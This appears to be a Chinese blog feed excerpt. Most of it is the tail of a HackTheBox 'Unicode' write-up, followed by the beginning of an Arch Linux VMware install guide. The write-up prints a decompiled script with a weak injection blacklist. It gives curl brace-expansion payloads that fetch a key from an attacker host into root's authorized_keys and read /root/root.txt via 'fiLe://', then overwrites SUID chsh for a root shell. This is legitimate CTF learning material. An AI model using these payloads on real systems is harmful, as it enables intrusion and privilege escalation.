class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.8.0</span><br><span class="hljs-comment"># Python bytecode 3.8.0 (3413)</span><br><span class="hljs-comment"># Decompiled from: Python 3.8.2 (default, Jul 16 2020, 14:00:26) </span><br><span class="hljs-comment"># [GCC 9.3.0]</span><br><span class="hljs-comment"># Embedded file name: treport.py</span><br><span class="hljs-keyword">import</span> os, sys<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">threat_report</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">self</span>):<br>        file_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter the filename:&#x27;</span>)<br>        content = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter the report:&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../&#x27;</span> <span class="hljs-keyword">in</span> file_name:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NOT ALLOWED&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        file_path = <span class="hljs-string">&#x27;/root/reports/&#x27;</span> + file_name<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (fd):<br>            fd.write(content)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">list_files</span>(<span class="hljs-params">self</span>):<br>        file_list = os.listdir(<span class="hljs-string">&#x27;/root/reports/&#x27;</span>)<br>        files_in_dir = <span class="hljs-string">&#x27; &#x27;</span>.join([<span class="hljs-built_in">str</span>(elem) <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> file_list])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ALL THE THREAT REPORTS:&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(files_in_dir)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">self</span>):<br>        file_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;\nEnter the filename:&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../&#x27;</span> <span class="hljs-keyword">in</span> file_name:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NOT ALLOWED&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        contents = <span class="hljs-string">&#x27;&#x27;</span><br>        file_name = <span class="hljs-string">&#x27;/root/reports/&#x27;</span> + file_name<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> (fd):<br>                contents = fd.read()<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SOMETHING IS WRONG&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(contents)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self</span>):<br>        now = datetime.now()<br>        current_time = now.strftime(<span class="hljs-string">&#x27;%H_%M_%S&#x27;</span>)<br>        command_injection_list = [<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>]<br>        ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter the IP/file_name:&#x27;</span>)<br>        res = <span class="hljs-built_in">bool</span>(re.search(<span class="hljs-string">&#x27;\\s&#x27;</span>, ip))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;INVALID IP&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> ip <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;gopher&#x27;</span> <span class="hljs-keyword">in</span> ip <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">in</span> ip:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;INVALID URL&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">vars</span> <span class="hljs-keyword">in</span> command_injection_list:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">vars</span> <span class="hljs-keyword">in</span> ip:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NOT ALLOWED&#x27;</span>)<br>                sys.exit(<span class="hljs-number">0</span>)<br>            cmd = <span class="hljs-string">&#x27;/bin/bash -c &quot;curl &#x27;</span> + ip + <span class="hljs-string">&#x27; -o /root/reports/threat_report_&#x27;</span> + current_time + <span class="hljs-string">&#x27;&quot;&#x27;</span><br>            os.system(cmd)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    obj = threat_report()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1.Create Threat Report.&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;2.Read Threat Report.&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;3.Download A Threat Report.&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;4.Quit.&#x27;</span>)<br>    check = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> check:<br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your choice:&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            choice = <span class="hljs-built_in">int</span>(choice)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Input&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> choice == <span class="hljs-number">1</span>:<br>                obj.create()<br>            <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">2</span>:<br>                obj.list_files()<br>                obj.read_file()<br>            <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">3</span>:<br>                obj.download()<br>            <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">4</span>:<br>                check = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong input.&#x27;</span>)<br><span class="hljs-comment"># okay decompiling treport.pyc</span><br></code></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>其中<code>download</code>函数比较有意思，它首先检查了过滤，然后使用了<code>os.system</code>来执行命令。</p><p>我们能控制的只有cmd中的ip参数，然后一些bash中的命令分隔符号都被过滤了，无法通过<code>;&amp;&#39;|&gt;&lt;</code>这些符号来执行另一条系统命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cmd = <span class="hljs-string">&#x27;/bin/bash -c &quot;curl &#x27;</span> + ip + <span class="hljs-string">&#x27; -o /root/reports/threat_report_&#x27;</span> + current_time + <span class="hljs-string">&#x27;&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>但是curl有一个特性就是它在传入多重参数的时候不会报错，而是会选择先出现的参数，亦即我们需要将命令中原本的<code>-o</code>参数给覆盖成自己的。</p><p>这个方案还有一个问题是该如何输入空格，一个可行的方案如下，原理是使用了Bash的<a href="https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html">Brace Expansion</a>特性。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">16.4</span><span class="hljs-regexp">/key,-o,/</span>root<span class="hljs-regexp">/.ssh/</span>authorized_keys&#125;<br></code></pre></td></tr></table></figure><p>在拼接后，最后执行的命令如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">16.4</span><span class="hljs-regexp">/key -o /</span>root<span class="hljs-regexp">/.ssh/</span>authorized_keys -o <span class="hljs-regexp">/root/</span>reports/threat_report_[current_time]<br></code></pre></td></tr></table></figure><p>在本机上架设http服务器，传送自己的公钥即可。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➤  python3 -m http.server <span class="hljs-number">80</span>                          <br>Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.11.126</span> - - <span class="hljs-string">[19/May/2022 10:47:11]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /key HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure><p>然后就能连接上root的ssh了。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➤  ssh root<span class="hljs-title">@hackmedia.htb</span><br><br>root<span class="hljs-title">@code</span>:~# cat root.txt<br><span class="hljs-number">926e6</span><span class="hljs-keyword">c</span><span class="hljs-number">18</span>a<span class="hljs-number">43</span>aa<span class="hljs-number">228</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">974</span><span class="hljs-keyword">c</span><span class="hljs-number">20500</span>a<span class="hljs-number">181</span><br></code></pre></td></tr></table></figure><h1 id="0x03-一些后记"><a href="#0x03-一些后记" class="headerlink" title="0x03 一些后记"></a>0x03 一些后记</h1><p>看了0xdf大哥的<a href="https://0xdf.gitlab.io/2022/05/07/htb-unicode.html#reverse-treport">帖子</a>，在提权上的思路有所收获。特此记录。</p><h2 id="任意文件读"><a href="#任意文件读" class="headerlink" title="任意文件读"></a>任意文件读</h2><p>注意到treport.py中有这样一段代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> ip or <span class="hljs-string">&#x27;gopher&#x27;</span> <span class="hljs-keyword">in</span> ip or <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">in</span> ip:<br>print(<span class="hljs-string">&#x27;INVALID URL&#x27;</span>)<br>sys.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>这个代码本身是为了防止我们使用file等伪协议直接读取本地的文件的，但是注意到 Python 检查是区分大小写的，而curl 并不关心。 我可以将它与正文的命令注入结合起来读取文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;fiLe:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt&#125;<br></code></pre></td></tr></table></figure><p>之后执行的命令如下，再查看文件即可拿到root.txt。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl fiLe:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt  -o <span class="hljs-regexp">/root/</span>reports/threat_report_[current_time]<br></code></pre></td></tr></table></figure><h2 id="读写综合利用"><a href="#读写综合利用" class="headerlink" title="读写综合利用"></a>读写综合利用</h2><p>任意文件读写的综合利用还可以产生一个有趣的文件读取思路。</p><p>首先查找具有<code>SUID</code>权限的文件。如<code>/usr/bin/chsh</code>，命令可以使用<code>find / -perm -4000 -user root 2&gt;/dev/null</code>。</p><p>然后将<code>/usr/bin/chsh</code>使用<code>sh</code>覆写：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">Enter your <span class="hljs-symbol">choice:</span><span class="hljs-number">3</span><br>Enter the <span class="hljs-variable constant_">IP</span>/<span class="hljs-symbol">file_name:</span>&#123;<span class="hljs-symbol">File:</span>/<span class="hljs-regexp">//bin</span><span class="hljs-regexp">/sh,-o,/usr</span><span class="hljs-regexp">/bin/chsh</span>&#125;<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br><span class="hljs-number">100</span>  126k  <span class="hljs-number">100</span>  126k    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   123M      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  123M<br>Enter your <span class="hljs-symbol">choice:</span><br></code></pre></td></tr></table></figure><p>覆写后文件的SUID位不会变化，此时使用命令<code>chsh -p</code>（对应原来的<code>sh -p</code>）命令即可获得root的shell。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">code@code:~$ chsh -p<br><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=1000(code) <span class="hljs-attribute">gid</span>=1000(code) <span class="hljs-attribute">euid</span>=0(root) <span class="hljs-attribute">groups</span>=1000(code)<br></code></pre></td></tr></table></figure><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Medium难度的Linux靶机，主要考察内容如下：</p><ul><li>JWT中的JKU利用</li><li>基于Unicode机制的WAF Bypass</li><li>网站根目录的确定</li><li>打包后的python代码的还原</li><li>python代码审计</li><li>命令执行绕过技巧</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VMWare上Arch+xfce4的安装和美化</title>
    <link href="/2022/04/29/%E5%80%92%E8%85%BE/VMWare%E4%B8%8AArch+xfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96/"/>
    <url>/2022/04/29/%E5%80%92%E8%85%BE/VMWare%E4%B8%8AArch+xfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>捣鼓了一个工作日终于弄好了。记录一下，以作备忘。</p><p>虽然是在VMware上安装的，但是依旧适用于裸机等安装。详见下面正式教程。</p><h1 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428151628953.png" alt="image-20220428151628953"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428151648795.png" alt="image-20220428151648795"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/image-20220428151716579.png" alt="image-20220428151716579"></p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载导航页面如下：<br><a href="https://archlinux.org/download/">https://archlinux.org/download/</a></p><p>我最终下载的是<a href="http://mirrors.163.com/archlinux/iso/2021.03.01/">http://mirrors.163.com/archlinux/iso/2021.03.01/</a></p><p>下载完成后，建议比较一下文件的md5值。mac下载是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/Downloads $ md5 archlinux-2021.03.01-x86_64.iso                                        [10:35:00]<br>MD5 (archlinux-2021.03.01-x86_64.iso) = 954ccc00409d564938433611e3a81ae9<br></code></pre></td></tr></table></figure><h1 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建<a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020">虚拟机</a></h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"><br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214631.png" alt="在这里插入图片描述"><br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214632.png" alt="在这里插入图片描述"><br>虚拟机配置，我设置内存1G 硬盘20G仅供参考。</p><h1 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214633.png" alt="在这里插入图片描述"><br>等待加载，很快就进行了如下界面。<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214644.png" alt="在这里插入图片描述"><br>根据提示，我进下面地址看一下如何安装。<br><a href="https://wiki.archlinux.org/index.php/Installation_guide">https://wiki.archlinux.org/index.php/Installation_guide</a></p><h2 id="确保是否为-UEFI-模式"><a href="#确保是否为-UEFI-模式" class="headerlink" title="确保是否为 UEFI 模式"></a>确保是否为 UEFI 模式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /sys/firmware/efi/efivars<br></code></pre></td></tr></table></figure><p>如果输出一堆东西，说明就是UEFI模式的了。</p><h2 id="测试网络"><a href="#测试网络" class="headerlink" title="测试网络"></a>测试网络</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping www.baidu.com<br></code></pre></td></tr></table></figure><p>若能看到数据返回，即说明已经联网，ctrl+c 终止退出当前命令。<br>我的是直接可以连接，如果遇到网络不通的话自己百度解决。</p><h2 id="启用SSH（可选）"><a href="#启用SSH（可选）" class="headerlink" title="启用SSH（可选）"></a>启用SSH（可选）</h2><p>此项为补充内容，第一次安装时候所有命令都是直接在<a href="https://so.csdn.net/so/search?q=vmware&spm=1001.2101.3001.7020">vmware</a>中敲的。vmware中命令行无法复制，粘贴纯手打效率不高。所以我就想能不能ssh远程安装方便粘贴命令？答案是可以的而且很简单。</p><ol><li>查ip 执行 <code>ip addr</code> 我这里查到的ip 是 <code>172.16.184.11</code></li><li>设置root密码 <code>passwd root</code></li><li>客户端连接ssh 命令如下：<code>ssh root@172.16.184.11</code><br>简单的3步就可以粘贴命令了，复制粘贴要程序员的本能。</li></ol><h2 id="禁用-reflector"><a href="#禁用-reflector" class="headerlink" title="禁用 reflector"></a>禁用 reflector</h2><blockquote><p>2020 年新版 archliveiso 加入了 reflector 服务，它会自己更新<br>mirrorlist。在特定情况下，它会误删某些有用的源信息。这里联网后的第一件事就是将其禁用。也许它是一个好用的工具，但是很明显，它并不适合在安装的时候启用。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl stop reflector.service<br></code></pre></td></tr></table></figure><h2 id="更新系统时钟"><a href="#更新系统时钟" class="headerlink" title="更新系统时钟"></a>更新系统时钟</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">timedatectl set-ntp <span class="hljs-literal">true</span>    <span class="hljs-comment">#将系统时间与网络时间进行同步</span><br>timedatectl status          <span class="hljs-comment">#检查服务状态</span><br></code></pre></td></tr></table></figure><h2 id="更换国内镜像源加快下载速度"><a href="#更换国内镜像源加快下载速度" class="headerlink" title="更换国内镜像源加快下载速度"></a>更换国内镜像源加快下载速度</h2><p>这一步很关键，我第一次安装，根据<a href="https://wiki.archlinux.org/index.php/Installation_guide">官方文档</a>一步步安装，后来在安装步骤等待了1个多小时，还没成功，被迫放弃重新来一遍。<br>后来在<a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/basic_install%E7%9C%8B%E5%88%B0%E8%AE%BE%E7%BD%AE%E6%BA%90%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82">https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/basic_install看到设置源的内容。</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/pacman.d/mirrorlist<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x4eW91Y2Fu,size_16,color_FFFFFF,t_70-16510514214645.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Server = https://mirrors.ustc.edu.cn/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br>Server = https://mirrors.hit.edu.cn/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>在上面放上国内的源。</p><h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><p><strong>对于虚拟机，不建议分&#x2F;home分区出来，这样扩容会很麻烦</strong></p><p>ArchLinux官方文档参考：UEFI with GPT</p><table><thead><tr><th>挂在点</th><th>分区</th><th>分区类型</th><th>推荐尺寸</th></tr></thead><tbody><tr><td>&#x2F;mnt&#x2F;boot or &#x2F;mnt&#x2F;efi</td><td>&#x2F;dev&#x2F;efi_system_partition</td><td>EFI system partition</td><td>至少260 MiB</td></tr><tr><td>[SWAP]</td><td>&#x2F;dev&#x2F;swap_partition</td><td>Linux swap</td><td>超过 512 MiB</td></tr><tr><td>&#x2F;mnt</td><td>&#x2F;dev&#x2F;root_partition</td><td>Linux x86-64 root (&#x2F;)</td><td>磁盘的剩余空间</td></tr></tbody></table><p>我实际的分区：</p><table><thead><tr><th>挂在点</th><th>分区</th><th>分区类型</th><th>尺寸</th></tr></thead><tbody><tr><td>&#x2F;mnt&#x2F;boot or &#x2F;mnt&#x2F;efi</td><td>&#x2F;dev&#x2F;efi_system_partition</td><td>EFI system partition</td><td>300 MiB</td></tr><tr><td>[SWAP]</td><td>&#x2F;dev&#x2F;swap_partition</td><td>Linux swap</td><td>超过 2048 MiB</td></tr><tr><td>&#x2F;</td><td>&#x2F;dev&#x2F;root_partition</td><td>Linux x86-64 root (&#x2F;)</td><td>8G</td></tr><tr><td>&#x2F;home</td><td>&#x2F;dev&#x2F;root_partition</td><td>Linux x86-64 root (&#x2F;)</td><td>磁盘的剩余空间</td></tr></tbody></table><p>先查一下磁盘情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326145900457.png" alt="在这里插入图片描述"><br><strong>开始分区了</strong> 如果你磁盘里有数据请注意备份！ 因为我这个新建的虚拟机所以不用考虑备份的事情。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk /dev/sda<br></code></pre></td></tr></table></figure><h3 id="创建分区表"><a href="#创建分区表" class="headerlink" title="创建分区表"></a>创建分区表</h3><p>我们要创建一个 GUID Partition Table (GPT) 分区表，所以这里按<code>g</code><br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/VMWare%E4%B8%8AArchxfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96.assets/20210326110920185.png" 